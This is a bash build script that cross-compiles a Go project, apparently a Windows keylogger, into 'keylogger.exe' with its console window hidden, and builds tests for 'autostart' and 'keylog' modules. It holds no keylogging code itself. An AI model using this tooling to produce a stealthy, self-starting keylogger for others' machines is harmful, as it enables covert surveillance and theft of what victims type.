#!/usr/bin/bash

if [ "$1" != "" ]; then
	mkdir -p builds
fi

winbuild() {
	CC="x86_64-w64-mingw32-gcc" \
		GOOS="windows" \
		CGO_ENABLED="1" \
		"$@"
}

if [ "$1" == "release" ]; then
	winbuild go build -v -ldflags="-H windowsgui" -o builds/keylogger.exe main.go
fi

if [ "$1" == "test" ]; then
	winbuild go test -v -c -o builds/autostart_test.exe ./tests/autostart/autostart_test.go
	winbuild go test -v -c -o builds/logger_test.exe ./tests/keylog/keylogger_test.go
fi
